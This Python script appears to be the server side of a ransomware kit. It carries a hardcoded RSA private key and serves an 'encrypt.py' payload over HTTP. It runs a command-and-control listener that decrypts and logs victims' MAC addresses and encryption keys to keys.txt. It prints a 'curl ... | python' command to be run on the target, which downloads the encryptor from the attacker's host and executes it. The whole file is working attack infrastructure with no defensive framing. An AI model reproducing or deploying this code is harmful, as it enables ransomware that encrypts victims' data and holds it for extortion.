import os, sys
import socketserver
from threading import Thread

d = 2327901817774527680473519369380923535566716819141996452731082915652753036919225692605842106327153089784094841637993373496994829233249791126253603486145741899220562159461735070431726021334681810102625304777497438505539957555437342750057739774007389865949707445194289220205727160901354863727497923106051384970312701344184479846378496302793555906547503899817187326474997791919801487690757633205076439213075000858263470276989252275796338949793721621150148651640693349573524610710477176820176629557380253107741482950848040024658383030766479929139868900045415050131944186438247380975013676496264751473212683637650343817473
n = 22466399356696862731685460208536256783188295869544457022072227816240396978327179503929473787484833346122331647672079184018341143976658183711855452147632218363099507748723444584307186726092264004520230401531914682080414121902690738403053284478021177284504064622567188105087470595146647086714874113551712199212375574216827105240594373977988113451671659896269402642741219620176131351014538627627204645634270476582567408556693640852699275199045012477333095808487525731951395963847134111089418082435882695850104687438854973215059721934500177949103585579224334671443796943358957248198002033006632866304770882248161383680853

hostname = 'localhost'
ph_port = 8880
c2_port = 1337

if len(sys.argv) > 3:
    hostname, ph_port, c2_port = sys.argv[1:4]
elif len(sys.argv) == 3:
    hostname, ph_port = sys.argv[1:3]
elif len(sys.argv) == 2:
    hostname = sys.argv[1]

with open(os.path.join(os.path.dirname(__file__), "encrypt.py"), mode = 'rb') as payload_file:
    PAYLOAD = payload_file.read().replace(b'{{remote_addr}}', bytes(hostname, 'ascii')).replace(b'{{remote_port}}', bytes(str(c2_port), 'ascii'))

def decrypt_key(ct, d, n):
    b = int.from_bytes(ct, 'big')

    pt = pow(b, d, n).to_bytes(22, 'big')
    return (pt[:6], pt[6:])

class C2Handler(socketserver.StreamRequestHandler):
    def handle(self) -> None:
        data = self.request.recv(256)
        mac, key = decrypt_key(data, d, n)
        print(mac.hex())
        print(key.hex())
        with open('keys.txt', mode = 'ab') as keyfile:
            keyfile.write(mac + b': ' + key + "\n")

class PayloadHandler(socketserver.StreamRequestHandler):
    def handle(self) -> None:
        self.data = self.request.recv(16)
        self.request.send(b"HTTP/1.1 200 OK\r\n")
        self.request.send(b"Content-Type: text/plain\r\n")
        self.request.send(bytes(f"Content-Length: {len(PAYLOAD)}\r\n\r\n", 'utf-8'))
        self.request.send(PAYLOAD)

def start_payload_handler(port):
    with socketserver.TCPServer(("0.0.0.0", port), PayloadHandler) as server:
        server.serve_forever()

def start_c2(port):
    with socketserver.TCPServer(("0.0.0.0", port), C2Handler) as server:
        server.serve_forever()

print(f"Execute following command on the target to start encryption:")
print(f"\tcurl -s http://{hostname}:{ph_port} | python")
ph_thread = Thread(target=start_payload_handler, args=[ph_port], name='ph_thr')
ph_thread.start()
start_c2(c2_port)
